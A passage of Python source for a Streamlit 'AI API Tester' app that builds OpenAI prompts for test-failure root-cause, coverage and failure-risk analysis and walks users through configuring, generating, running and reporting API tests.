OWASP Category: {context.get('owasp_category', 'N/A')}

FOCUS: Assess security vulnerability severity, exploit potential, immediate risks.
"""

        elif test_type == 'regression':
            prompt += f"""
Regression Context:
==================
Baseline Version: {context.get('baseline_version', 'N/A')}
Current Version: {context.get('current_version', 'N/A')}
Changes Detected: {context.get('changes_count', 'N/A')}
Breaking Changes: {context.get('breaking_changes', 'N/A')}

FOCUS: Identify breaking changes, backward compatibility issues, migration impact.
"""

        elif test_type == 'smoke':
            prompt += f"""
Smoke Test Context:
==================
Critical Endpoint: YES
Deployment Stage: {context.get('deployment_stage', 'N/A')}
Depends On: {context.get('dependencies', 'N/A')}

FOCUS: This is a critical health check. Failure blocks deployment. Identify systemic issues.
"""

        elif test_type == 'chaos':
            prompt += f"""
Chaos Engineering Context:
=========================
Chaos Scenario: {context.get('chaos_scenario', 'N/A')}
Injected Failure: {context.get('injected_failure', 'N/A')}
Expected Behavior: System should remain resilient
Actual Behavior: System failed to recover

FOCUS: Assess resilience failures, missing fallbacks, recovery mechanisms.
"""

        elif test_type == 'contract':
            prompt += f"""
Contract Testing Context:
========================
Contract Version: {context.get('contract_version', 'N/A')}
Consumer: {context.get('consumer', 'N/A')}
Provider: {context.get('provider', 'N/A')}
Schema Expected: {json.dumps(context.get('expected_schema', {}), indent=2)}

FOCUS: Identify contract violations, schema mismatches, breaking changes for consumers.
"""

        # Add instructions
        prompt += """

ANALYSIS REQUIRED:
=================
Provide a comprehensive root cause analysis in the following JSON format:

{
    "root_cause": "Clear, technical explanation of WHY this failure occurred. Be specific about the underlying issue, not just symptoms.",
    "severity": "critical|high|medium|low - Assess based on business impact, security risk, and urgency",
    "category": "authentication|data|network|logic|performance|security|configuration|dependency|infrastructure",
    "technical_details": "Deep dive into the technical aspects. What's happening at the code/system level?",
    "business_impact": "What does this mean for users, business operations, or revenue? Be realistic.",
    "recommendations": [
        "Specific, actionable fix #1 (e.g., 'Add null check in UserService.login() before accessing user.email')",
        "Specific, actionable fix #2 (e.g., 'Implement circuit breaker with 5s timeout for database calls')",
        "Specific, actionable fix #3 (preventive measure)"
    ],
    "next_steps": [
        "Immediate action #1 (what to do RIGHT NOW)",
        "Immediate action #2",
        "Follow-up action"
    ],
    "related_issues": [
        "Common pattern #1 that could cause this",
        "Common pattern #2",
        "Similar issue to watch for"
    ],
    "confidence_score": 0.85,
    "estimated_fix_time": "30 minutes|2 hours|1 day - realistic estimate",
    "requires_deployment": true|false
}

CRITICAL: Be direct, technical, and actionable. Think like a CTO reviewing a P0 incident.
"""

        return prompt

    def _build_batch_analysis_prompt(self, failures: List[Dict]) -> str:
        """Builds prompt for analyzing multiple failures together"""

        failure_summary = []
        for i, failure in enumerate(failures[:10], 1):  # Limit to first 10 for context
            failure_summary.append({
                'test_name': failure.get('test_name'),
                'endpoint': failure.get('endpoint'),
                'status': failure.get('actual_status'),
                'error': failure.get('error_message', '')[:100]
            })

        prompt = f"""
SYSTEM-WIDE FAILURE ANALYSIS - {len(failures)} TESTS FAILED

Failure Summary:
===============
{json.dumps(failure_summary, indent=2)}

PATTERN ANALYSIS REQUIRED:
=========================
Analyze these failures and return JSON:

{{
    "common_cause": "Is there a single root cause affecting all/most tests? Be specific.",
    "pattern": "cascading|isolated|systematic|random - What's the failure pattern?",
    "system_impact": "Database down|Service degraded|Network issue|etc - High-level diagnosis",
    "failure_correlation": "How are these failures related? What's the dependency chain?",
    "fix_priority": [
        "test_name_1 - Fix this FIRST because...",
        "test_name_2 - Then this because...",
        "test_name_3 - Finally this..."
    ],
    "root_cause_analysis": "Technical explanation of the systemic issue",
    "blast_radius": "Which other systems/services might be affected?",
    "recovery_steps": [
        "Step 1 to restore service",
        "Step 2",
        "Step 3"
    ],
    "prevention": "How to prevent this class of failure in the future",
    "confidence": 0.90
}}

Think like an SRE during a production incident. What's the REAL problem?
"""
        return prompt

    def _validate_and_enhance_analysis(self, analysis: Dict, context: Dict) -> Dict:
        """Validates AI response and adds metadata"""

        # Ensure required fields
        analysis.setdefault('root_cause', 'Analysis incomplete')
        analysis.setdefault('severity', 'medium')
        analysis.setdefault('category', 'unknown')
        analysis.setdefault('recommendations', ['Manual investigation required'])
        analysis.setdefault('technical_details', 'N/A')
        analysis.setdefault('business_impact', 'Unknown impact')
        analysis.setdefault('next_steps', ['Review logs and investigate'])
        analysis.setdefault('related_issues', [])
        analysis.setdefault('confidence_score', 0.5)
        analysis.setdefault('estimated_fix_time', 'Unknown')
        analysis.setdefault('requires_deployment', False)

        # Add metadata
        analysis['analyzed_at'] = datetime.now().isoformat()
        analysis['test_type'] = context.get('test_type')
        analysis['endpoint'] = context.get('endpoint')
        analysis['analyzer_version'] = '1.0.0'

        return analysis

    def _get_fallback_analysis(self) -> Dict:
        """Returns a fallback analysis when AI is unavailable"""
        return {
            'root_cause': 'AI analysis unavailable - OpenAI API key not configured',
            'severity': 'unknown',
            'category': 'unknown',
            'technical_details': 'Manual analysis required',
            'business_impact': 'Unable to assess',
            'recommendations': [
                'Review test logs manually',
                'Compare with expected behavior',
                'Check API documentation'
            ],
            'next_steps': [
                'Configure OpenAI API key to enable AI analysis'
            ],
            'related_issues': [],
            'confidence_score': 0.0,
            'estimated_fix_time': 'Unknown',
            'requires_deployment': False,
            'analyzed_at': datetime.now().isoformat(),
            'ai_available': False
        }

    def analyze_test_coverage(self, test_data: Dict) -> Dict:
        """
        Analyzes test coverage and identifies gaps in testing strategy.

        Args:
            test_data: Dictionary containing:
                - endpoints: List of API endpoints (with methods, paths)
                - test_cases: List of generated test cases
                - api_spec: Optional API specification

        Returns:
            Coverage analysis with gaps and recommendations
        """
        if not self.client:
            return {
                'coverage_score': 0.0,
                'gaps': ['AI analysis unavailable'],
                'recommendations': ['Configure OpenAI API key for coverage analysis'],
                'missing_scenarios': []
            }

        try:
            prompt = f"""
You are a Senior QA Architect analyzing API test coverage.

API Endpoints:
{json.dumps(test_data.get('endpoints', []), indent=2)}

Generated Test Cases:
{json.dumps(test_data.get('test_cases', []), indent=2)[:2000]}

Total Test Count: {len(test_data.get('test_cases', []))}

COVERAGE ANALYSIS REQUIRED:
===========================
Analyze the test coverage and return JSON:

{{
    "coverage_score": 0.85,  // 0.0-1.0 scale
    "covered_scenarios": [
        "Happy path - all CRUD operations",
        "Authentication validation",
        "Input validation for required fields"
    ],
    "missing_scenarios": [
        "DELETE endpoint not tested",
        "Concurrent request handling not covered",
        "Rate limiting behavior not validated",
        "Error recovery scenarios missing"
    ],
    "gaps_by_category": {{
        "authentication": ["Token expiration not tested", "Invalid credentials edge cases"],
        "data_validation": ["Field length limits not checked", "Special characters not tested"],
        "error_handling": ["Network timeout scenarios", "Malformed JSON handling"],
        "performance": ["High load scenarios", "Response time thresholds"],
        "security": ["SQL injection tests needed", "XSS vulnerability checks missing"]
    }},
    "recommendations": [
        "Add DELETE /api/users/{id} test cases with authorization checks",
        "Implement concurrent request tests (minimum 10 parallel requests)",
        "Add rate limiting tests to verify 429 status code behavior",
        "Test authentication token expiration after 1 hour",
        "Add malformed JSON payload tests for all POST/PUT endpoints"
    ],
    "priority_tests": [
        {{
            "description": "Test DELETE user with non-owner credentials (security critical)",
            "endpoint": "/api/users/{{id}}",
            "method": "DELETE",
            "priority": "critical",
            "reason": "Authorization bypass vulnerability risk"
        }},
        {{
            "description": "Test rate limiting at 100 requests/minute",
            "endpoint": "/api/*",
            "method": "GET",
            "priority": "high",
            "reason": "Prevent DoS attacks"
        }}
    ],
    "coverage_by_endpoint": {{
        "/api/users": {{
            "methods_tested": ["GET", "POST", "PUT"],
            "methods_missing": ["DELETE"],
            "scenarios_covered": 8,
            "scenarios_needed": 3,
            "coverage_percent": 72
        }}
    }},
    "estimated_additional_tests": 15,
    "confidence": 0.90
}}

Be thorough and specific. Identify real gaps, not theoretical ones.
"""

            response = self.client.chat.completions.create(
                model=self.model,
                temperature=0.2,
                max_tokens=3000,
                messages=[
                    {
                        "role": "system",
                        "content": "You are a QA expert specializing in API test coverage analysis."
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                response_format={"type": "json_object"}
            )

            analysis = json.loads(response.choices[0].message.content)
            analysis['analyzed_at'] = datetime.now().isoformat()
            analysis['total_tests_analyzed'] = len(test_data.get('test_cases', []))
            return analysis

        except Exception as e:
            print(f"❌ Coverage analysis failed: {str(e)}")
            return {
                'coverage_score': 0.0,
                'gaps': [f'Analysis error: {str(e)}'],
                'recommendations': ['Manual coverage review required'],
                'missing_scenarios': []
            }

    def predict_failure_risk(self, test_history: List[Dict], upcoming_changes: Dict = None) -> Dict:
        """
        Predicts which tests are likely to fail based on historical patterns and upcoming changes.
        Predictive Test Maintenance feature.

        Args:
            test_history: List of historical test results
            upcoming_changes: Optional dict with upcoming API/code changes

        Returns:
            Predictions with risk scores and recommendations
        """
        if not self.client or not test_history:
            return {
                'high_risk_tests': [],
                'predictions': 'Insufficient data for prediction',
                'recommendations': ['Run tests to build history']
            }

        try:
            # Summarize history
            failure_patterns = self._extract_failure_patterns(test_history)

            prompt = f"""
You are a Principal Engineer with ML expertise, predicting test failures.

Historical Test Data Summary:
{json.dumps(failure_patterns, indent=2)[:1500]}

Upcoming Changes:
{json.dumps(upcoming_changes or {}, indent=2)}

PREDICTIVE ANALYSIS REQUIRED:
=============================
Predict which tests will likely fail and return JSON:

{{
    "high_risk_tests": [
        {{
            "test_name": "POST /api/users - Create user",
            "risk_score": 0.85,  // 0.0-1.0
            "failure_probability": "85%",
            "reasons": [
                "Failed 3 times in last 5 runs",
                "Upcoming schema change affects user creation",
                "Similar pattern to previous breaking change on 2024-12-15"
            ],
            "recommended_action": "Update test assertions to match new schema",
            "estimated_fix_effort": "15 minutes"
        }}
    ],
    "medium_risk_tests": [
        {{
            "test_name": "GET /api/users - List users",
            "risk_score": 0.45,
            "reasons": ["Occasionally slow response time"],
            "recommended_action": "Monitor performance, increase timeout if needed"
        }}
    ]],
    "breaking_change_impact": {{
        "affected_tests_count": 5,
        "critical_tests": 2,
        "estimated_fix_time": "2 hours",
        "requires_test_updates": true
    }},
    "recommendations": [
        "Update 3 tests before deployment to prevent failures",
        "Add new test for changed authentication flow",
        "Review timeout settings for performance tests"
    ]],
    "confidence": 0.78
}}

Focus on actionable predictions, not speculation.
"""

            response = self.client.chat.completions.create(
                model=self.model,
                temperature=0.2,
                max_tokens=2500,
                messages=[
                    {
                        "role": "system",
                        "content": "You are a predictive analytics expert for software testing."
                    },
                    {
                        "role": "user",
                        "content": prompt
                    }
                ],
                response_format={"type": "json_object"}
            )

            predictions = json.loads(response.choices[0].message.content)
            predictions['analyzed_at'] = datetime.now().isoformat()
            predictions['history_analyzed'] = len(test_history)
            return predictions

        except Exception as e:
            print(f"❌ Predictive analysis failed: {str(e)}")
            return {
                'high_risk_tests': [],
                'predictions': f'Error: {str(e)}',
                'recommendations': ['Manual risk assessment required']
            }

    def _extract_failure_patterns(self, test_history: List[Dict]) -> Dict:
        """Extract patterns from test history for predictive analysis"""
        patterns = {
            'total_runs': len(test_history),
            'failure_rate': 0.0,
            'flaky_tests': [],
            'consistently_failing': [],
            'recent_failures': []
        }

        if not test_history:
            return patterns

        # Calculate failure rate
        failures = [t for t in test_history if t.get('status') == 'FAIL']
        patterns['failure_rate'] = len(failures) / len(test_history) if test_history else 0

        # Identify flaky tests (intermittent failures)
        test_results = {}
        for test in test_history:
            name = test.get('test_name', 'unknown')
            if name not in test_results:
                test_results[name] = []
            test_results[name].append(test.get('status') == 'PASS')

        for test_name, results in test_results.items():
            if len(results) >= 3:
                # Flaky if has both passes and failures
                if True in results and False in results:
                    fail_rate = results.count(False) / len(results)
                    if 0.2 < fail_rate < 0.8:  # Flaky range
                        patterns['flaky_tests'].append({
                            'name': test_name,
                            'failure_rate': fail_rate
                        })
                # Consistently failing
                elif results.count(False) / len(results) > 0.8:
                    patterns['consistently_failing'].append(test_name)

        # Recent failures (last 5)
        recent = test_history[-5:] if len(test_history) >= 5 else test_history
        patterns['recent_failures'] = [
            t.get('test_name') for t in recent if t.get('status') == 'FAIL'
        ]

        return patterns


def main():
    st.set_page_config(
        page_title="AI API Tester",
        page_icon="🚀",
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    openai_api_key = os.getenv('OPENAI_API_KEY')

    if not openai_api_key:
        st.error("⚠️ OPENAI_API_KEY not found in .env file")
        st.info("Create a .env file with: OPENAI_API_KEY=your_api_key_here")
        st.stop()
    
    # Modern CSS
    st.markdown("""
        <style>
        /* Import modern font */
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * {
            font-family: 'Inter', sans-serif;
        }
        
        /* Sidebar styling */
        [data-testid="stSidebar"] {
            background: linear-gradient(180deg, #1e3a8a 0%, #1e40af 100%);
        }
        
        [data-testid="stSidebar"] .css-1d391kg, [data-testid="stSidebar"] .st-emotion-cache-16idsys {
            color: white;
        }
        
        /* Sidebar navigation buttons */
        .nav-button {
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 12px;
            padding: 16px;
            margin: 8px 0;
            cursor: pointer;
            transition: all 0.3s ease;
            color: white;
        }
        
        .nav-button:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateX(5px);
        }
        
        .nav-button-active {
            background: rgba(255, 255, 255, 0.25);
            border-left: 4px solid #60a5fa;
        }
        
        /* Main content area */
        .main-content {
            padding: 2rem;
            max-width: 1400px;
            margin: 0 auto;
        }
        
        /* Card styling */
        .card {
            background: white;
            border-radius: 16px;
            padding: 24px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.07);
            margin-bottom: 20px;
            border: 1px solid #e5e7eb;
        }
        
        /* Header */
        .page-header {
            font-size: 2.5rem;
            font-weight: 700;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }
        
        .page-subtitle {
            color: #6b7280;
            font-size: 1.1rem;
            margin-bottom: 2rem;
        }
        
        /* Buttons */
        .stButton>button {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            padding: 12px 24px;
            font-weight: 600;
            transition: all 0.3s ease;
        }
        
        .stButton>button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 15px rgba(102, 126, 234, 0.4);
        }
        
        /* Progress steps */
        .step {
            display: flex;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            background: #e5e7eb;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            margin-right: 12px;
        }
        
        .step-active .step-number {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
        }
        
        .step-complete .step-number {
            background: #10b981;
            color: white;
        }
        
        /* Metrics */
        .metric-card {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 12px;
            padding: 20px;
            color: white;
            text-align: center;
        }
        
        .metric-value {
            font-size: 2.5rem;
            font-weight: 700;
        }
        
        .metric-label {
            font-size: 0.9rem;
            opacity: 0.9;
        }
        
        /* Success/Error boxes */
        .success-box {
            background: #ecfdf5;
            border-left: 4px solid #10b981;
            padding: 16px;
            border-radius: 8px;
            margin: 12px 0;
        }
        
        .error-box {
            background: #fef2f2;
            border-left: 4px solid #ef4444;
            padding: 16px;
            border-radius: 8px;
            margin: 12px 0;
        }
        
        /* Hide streamlit branding */
        #MainMenu {visibility: hidden;}
        footer {visibility: hidden;}
        </style>
    """, unsafe_allow_html=True)
    
    # Initialize session state
    if 'current_step' not in st.session_state:
        st.session_state.current_step = 1
    if 'test_cases' not in st.session_state:
        st.session_state.test_cases = []
    if 'test_results' not in st.session_state:
        st.session_state.test_results = None
    if 'api_url' not in st.session_state:
        st.session_state.api_url = "https://jsonplaceholder.typicode.com/posts"
    if 'auth_config' not in st.session_state:
        st.session_state.auth_config = {'type': 'none'}
    if 'timeout' not in st.session_state:
        st.session_state.timeout = 10
    
    # SIDEBAR NAVIGATION
    with st.sidebar:
        st.markdown("<h2 style='color: white; margin-bottom: 2rem;'>🚀 AI API Tester</h2>", unsafe_allow_html=True)
        
        # Navigation steps
        steps = [
            {"num": 1, "icon": "🎯", "title": "Configure API", "desc": "Set up endpoint"},
            {"num": 2, "icon": "🔐", "title": "Authentication", "desc": "Optional security"},
            {"num": 3, "icon": "⚙️", "title": "Generate Tests", "desc": "AI-powered"},
            {"num": 4, "icon": "▶️", "title": "Run Tests", "desc": "Execute & view"},
            {"num": 5, "icon": "📊", "title": "Results", "desc": "Download reports"}
        ]
        
        for step in steps:
            is_active = st.session_state.current_step == step['num']
            is_complete = st.session_state.current_step > step['num']
            
            button_class = "nav-button-active" if is_active else ""
            if is_complete:
                button_class += " step-complete"
            
            if st.button(
                f"{step['icon']} {step['title']}\n{step['desc']}",
                key=f"nav_{step['num']}",
                use_container_width=True
            ):
                st.session_state.current_step = step['num']
                st.rerun()
        
        st.markdown("<hr style='border-color: rgba(255,255,255,0.2); margin: 2rem 0;'>", unsafe_allow_html=True)
        
        # Progress indicator
        progress = (st.session_state.current_step / 5) * 100
        st.markdown(f"<p style='color: white; font-size: 0.9rem;'>Progress: {int(progress)}%</p>", unsafe_allow_html=True)
        st.progress(progress / 100)
        
        # Quick stats
        if st.session_state.test_cases:
            st.markdown("<br>", unsafe_allow_html=True)
            st.markdown(f"""
                <div style='background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px; color: white;'>
                    <p style='margin: 0; font-size: 0.85rem;'>📦 Tests Ready: {len(st.session_state.test_cases)}</p>
                </div>
            """, unsafe_allow_html=True)
        
        if st.session_state.test_results:
            summary = st.session_state.test_results.get_summary()
            st.markdown(f"""
                <div style='background: rgba(255,255,255,0.1); padding: 12px; border-radius: 8px; color: white; margin-top: 8px;'>
                    <p style='margin: 0; font-size: 0.85rem;'>✅ Passed: {summary['passed']}</p>
                    <p style='margin: 0; font-size: 0.85rem;'>❌ Failed: {summary['failed']}</p>
                </div>
            """, unsafe_allow_html=True)
    
    # MAIN CONTENT AREA
    st.markdown("<div class='main-content'>", unsafe_allow_html=True)
    
    # STEP 1: Configure API
    if st.session_state.current_step == 1:
        st.markdown("<h1 class='page-header'>🎯 Step 1: Configure Your API</h1>", unsafe_allow_html=True)
        st.markdown("<p class='page-subtitle'>Enter your API endpoint details to get started</p>", unsafe_allow_html=True)
        
        with st.container():
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            
            col1, col2 = st.columns([2, 1])
            
            with col1:
                st.markdown("### 🌐 API Endpoint")
                api_url = st.text_input(
                    "Base URL",
                    value=st.session_state.api_url,
                    placeholder="https://api.example.com/v1/resources",
                    label_visibility="collapsed"
                )
                
                st.markdown("### 📝 Sample Data Structure")
                sample_data = st.text_area(
                    "Sample JSON",
                    value='{\n  "title": "Test Post",\n  "body": "This is a test",\n  "userId": 1\n}',
                    height=200,
                    label_visibility="collapsed"
                )
            
            with col2:
                st.markdown("### ⚙️ Configuration")
                timeout = st.slider("Request Timeout (seconds)", 5, 60, st.session_state.timeout, 5)
                
                st.markdown("### 📌 Quick Tips")
                st.info("""
                ✨ Enter your API's base URL
                
                ✨ Provide sample JSON data
                
                ✨ Adjust timeout for slow APIs
                """)
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            col1, col2, col3 = st.columns([1, 1, 2])
            with col2:
                if st.button("➡️ Next: Authentication", type="primary", use_container_width=True):
                    if api_url:
                        st.session_state.api_url = api_url
                        st.session_state.timeout = timeout
                        st.session_state.sample_data = sample_data
                        st.session_state.current_step = 2
                        st.rerun()
                    else:
                        st.error("Please enter an API URL")
    
    # STEP 2: Authentication
    elif st.session_state.current_step == 2:
        st.markdown("<h1 class='page-header'>🔐 Step 2: Authentication Setup</h1>", unsafe_allow_html=True)
        st.markdown("<p class='page-subtitle'>Configure authentication if your API requires it</p>", unsafe_allow_html=True)
        
        with st.container():
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            
            auth_type = st.selectbox(
                "Authentication Type",
                options=["none", "bearer", "api_key", "basic"],
                format_func=lambda x: {
                    "none": "🚫 No Authentication",
                    "bearer": "🔑 Bearer Token (JWT)",
                    "api_key": "🗝️ API Key",
                    "basic": "👤 Basic Auth"
                }[x],
                index=0
            )
            
            auth_config = {'type': auth_type}
            
            if auth_type == "bearer":
                st.markdown("#### Bearer Token Configuration")
                token = st.text_input("Bearer Token", type="password", placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...")
                if token:
                    auth_config['token'] = token
                    st.success("✅ Bearer token configured")
            
            elif auth_type == "api_key":
                st.markdown("#### API Key Configuration")
                col1, col2 = st.columns(2)
                with col1:
                    key_name = st.text_input("Header Name", value="X-API-Key")
                with col2:
                    api_key = st.text_input("API Key", type="password", placeholder="your-api-key")
                
                if key_name and api_key:
                    auth_config['key_name'] = key_name
                    auth_config['api_key'] = api_key
                    st.success(f"✅ API Key configured: {key_name}")
            
            elif auth_type == "basic":
                st.markdown("#### Basic Authentication")
                col1, col2 = st.columns(2)
                with col1:
                    username = st.text_input("Username", placeholder="admin")
                with col2:
                    password = st.text_input("Password", type="password")
                
                if username and password:
                    auth_config['username'] = username
                    auth_config['password'] = password
                    st.success(f"✅ Basic auth configured for: {username}")
            
            else:
                st.info("ℹ️ No authentication required - tests will run without auth headers")
            
            st.session_state.auth_config = auth_config
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            col1, col2, col3 = st.columns([1, 1, 1])
            with col1:
                if st.button("⬅️ Back", use_container_width=True):
                    st.session_state.current_step = 1
                    st.rerun()
            with col2:
                if st.button("⭐ Skip", use_container_width=True):
                    st.session_state.current_step = 3
                    st.rerun()
            with col3:
                if st.button("➡️ Next: Generate Tests", type="primary", use_container_width=True):
                    st.session_state.current_step = 3
                    st.rerun()
    
    # STEP 3: Generate Tests
    elif st.session_state.current_step == 3:
        st.markdown("<h1 class='page-header'>⚙️ Step 3: Generate AI Tests</h1>", unsafe_allow_html=True)
        st.markdown("<p class='page-subtitle'>Let AI create intelligent test cases for your API</p>", unsafe_allow_html=True)
        
        with st.container():
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            
            col1, col2 = st.columns([2, 1])
            
            with col1:
                st.markdown("### 🎯 Test Configuration")
                num_tests = st.slider("Number of Test Cases", 10, 100, 30, 10)
                
                st.markdown("### 📋 Test Categories")
                col_a, col_b = st.columns(2)
                with col_a:
                    test_happy = st.checkbox("✅ Happy Path Tests", value=True)
                    test_edge = st.checkbox("⚠️ Edge Cases", value=True)
                with col_b:
                    test_negative = st.checkbox("❌ Negative Tests", value=True)
                    test_security = st.checkbox("🔒 Security Tests", value=True)
            
            with col2:
                st.markdown("### 📊 Current Setup")
                st.markdown(f"""
                <div class='metric-card'>
                    <div class='metric-value'>{num_tests}</div>
                    <div class='metric-label'>Tests to Generate</div>
                </div>
                """, unsafe_allow_html=True)
                
                st.markdown("<br>", unsafe_allow_html=True)
                st.info(f"""
                **API:** {st.session_state.api_url[:40]}...
                
                **Auth:** {st.session_state.auth_config.get('type', 'none')}
                
                **Timeout:** {st.session_state.timeout}s
                """)
            
            st.markdown("</div>", unsafe_allow_html=True)
            
            col1, col2, col3 = st.columns([1, 1, 1])
            with col1:
                if st.button("⬅️ Back", use_container_width=True):
                    st.session_state.current_step = 2
                    st.rerun()
            
            with col3:
                if st.button("🚀 Generate Tests", type="primary", use_container_width=True):
                    try:
                        sample_json = json.loads(st.session_state.sample_data)
                        
                        test_types = []
                        if test_happy: test_types.append("happy_path")
                        if test_edge: test_types.append("edge_cases")
                        if test_negative: test_types.append("negative_tests")
                        if test_security: test_types.append("security_tests")
                        
                        has_auth = st.session_state.auth_config.get('type') != 'none'
                        
                        # Use st.status instead of st.spinner for better visibility
                        with st.status("🤖 Generating test cases...", expanded=True) as status:
                            generator = OpenAITestGenerator(openai_api_key)
                            test_cases, used_fallback = generator.generate_test_cases(
                                api_url=st.session_state.api_url,
                                sample_data=sample_json,
                                num_tests=num_tests,
                                test_types=test_types,
                                has_auth=has_auth,
                                status_container=status
                            )
                            
                            status.update(label="✅ Test generation complete!", state="complete")
                        
                        if test_cases:
                            st.session_state.test_cases = test_cases
                            
                            if used_fallback:
                                st.warning(f"⚠️ Generated {len(test_cases)} tests using fallback method (AI unavailable or failed)")
                            else:
                                st.success(f"✅ AI generated {len(test_cases)} intelligent test cases!")
                            
                            time.sleep(1)
                            st.session_state.current_step = 4
                            st.rerun()
                        else:
                            st.error("❌ Failed to generate test cases")
                    
                    except json.JSONDecodeError:
                        st.error("❌ Invalid JSON in sample data")
                    except Exception as e:
                        st.error(f"❌ Error: {str(e)}")
        
        # Show existing test cases if any
        if st.session_state.test_cases:
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            st.markdown("### 📦 Previously Generated Tests")
            
            categories = {}
            for tc in st.session_state.test_cases:
                cat = tc.get('category', 'other')
                categories[cat] = categories.get(cat, 0) + 1
            
            cols = st.columns(4)
            cols[0].metric("😊 Happy Path", categories.get('happy_path', 0))
            cols[1].metric("⚠️ Edge Cases", categories.get('edge_case', 0))
            cols[2].metric("❌ Negative", categories.get('negative_test', 0))
            cols[3].metric("🔒 Security", categories.get('security_test', 0))
            
            with st.expander("📋 View Test Cases (First 5)"):
                for i, tc in enumerate(st.session_state.test_cases[:5], 1):
                    st.json(tc)
            
            st.markdown("</div>", unsafe_allow_html=True)
    
    # STEP 4: Run Tests
    elif st.session_state.current_step == 4:
        st.markdown("<h1 class='page-header'>▶️ Step 4: Run Tests</h1>", unsafe_allow_html=True)
        st.markdown("<p class='page-subtitle'>Execute your test suite and view real-time results</p>", unsafe_allow_html=True)
        
        if not st.session_state.test_cases:
            st.warning("⚠️ No test cases available. Please generate tests first.")
            if st.button("⬅️ Back to Generate Tests"):
                st.session_state.current_step = 3
                st.rerun()
        else:
            with st.container():
                st.markdown("<div class='card'>", unsafe_allow_html=True)
                
                col1, col2, col3 = st.columns(3)
                
                total_tests = len(st.session_state.test_cases)
                custom_count = len([tc for tc in st.session_state.test_cases if tc.get('category') == 'custom'])
                ai_count = total_tests - custom_count
                
                with col1:
                    st.markdown(f"""
                    <div class='metric-card'>
                        <div class='metric-value'>{total_tests}</div>
                        <div class='metric-label'>Total Tests</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col2:
                    st.markdown(f"""
                    <div class='metric-card' style='background: linear-gradient(135deg, #10b981 0%, #059669 100%);'>
                        <div class='metric-value'>{ai_count}</div>
                        <div class='metric-label'>AI Generated</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                with col3:
                    st.markdown(f"""
                    <div class='metric-card' style='background: linear-gradient(135deg, #f59e0b 0%, #d97706 100%);'>
                        <div class='metric-value'>{custom_count}</div>
                        <div class='metric-label'>Custom Tests</div>
                    </div>
                    """, unsafe_allow_html=True)
                
                st.markdown("</div>", unsafe_allow_html=True)
                
                col1, col2, col3 = st.columns([1, 1, 1])
                with col1:
                    if st.button("⬅️ Back", use_container_width=True):
                        st.session_state.current_step = 3
                        st.rerun()
                
                with col3:
                    if st.button("▶️ Run All Tests", type="primary", use_container_width=True):
                        auth_config = st.session_state.auth_config
                        timeout = st.session_state.timeout
                        
                        progress_bar = st.progress(0)
                        status_text = st.empty()
                        
                        with st.spinner("Running tests..."):
                            tester = APITester(
                                st.session_state.api_url,
                                auth_config=auth_config,
                                timeout=timeout
                            )
                            
                            total = len(st.session_state.test_cases)
                            for idx, test_case in enumerate(st.session_state.test_cases, 1):
                                status_text.text(f"Running test {idx}/{total}...")
                                progress_bar.progress(idx / total)
                                
                                tester.test_request(
                                    method=test_case.get('method', 'GET'),
                                    endpoint=test_case.get('endpoint', ''),
                                    data=test_case.get('data'),
                                    expected_status=test_case.get('expected_status', 200),
                                    test_name=f"Test {idx}: {test_case.get('description', 'N/A')}",
                                    params=test_case.get('params'),
                                    expected_body=test_case.get('expected_body'),
                                    expected_schema=test_case.get('expected_schema'),
                                    validate_body=test_case.get('validate_body', False)
                                )
                            
                            st.session_state.test_results = tester
                        
                        progress_bar.progress(100)
                        status_text.text("✅ All tests completed!")
                        st.success("Tests completed successfully!")
                        time.sleep(1)
                        st.session_state.current_step = 5
                        st.rerun()
            
            # Show previous results if available
            if st.session_state.test_results:
                st.markdown("<div class='card'>", unsafe_allow_html=True)
                st.markdown("### 📊 Previous Test Results")
                
                summary = st.session_state.test_results.get_summary()
                
                col1, col2, col3, col4 = st.columns(4)
                col1.metric("Total", summary['total'])
                col2.metric("Passed", summary['passed'], delta=None)
                col3.metric("Failed", summary['failed'], delta=None)
                col4.metric("Pass Rate", f"{summary['pass_rate']:.1f}%")
                
                if st.button("➡️ View Full Results"):
                    st.session_state.current_step = 5
                    st.rerun()
                
                st.markdown("</div>", unsafe_allow_html=True)
    
    # STEP 5: Results & Reports
    elif st.session_state.current_step == 5:
        st.markdown("<h1 class='page-header'>📊 Step 5: Results & Reports</h1>", unsafe_allow_html=True)
        st.markdown("<p class='page-subtitle'>View detailed results and download reports</p>", unsafe_allow_html=True)
        
        if not st.session_state.test_results:
            st.warning("⚠️ No test results available. Please run tests first.")
            if st.button("⬅️ Back to Run Tests"):
                st.session_state.current_step = 4
                st.rerun()
        else:
            tester = st.session_state.test_results
            summary = tester.get_summary()
            
            # Summary Cards
            st.markdown("<div class='card'>", unsafe_allow_html=True)
            st.markdown("### 📈 Test Summary")
            
            col1, col2, col3, col4 = st.columns(4)
            
            with col1:
                st.markdown(f"""
                <div class='metric-card' style='background: linear-gradient(135deg, #3b82f6 0%, #2563eb 100%);'>
                    <div class='metric-value'>{summary['total']}</div>
                    <div class='metric-label'>Total Tests</div>
                </div>
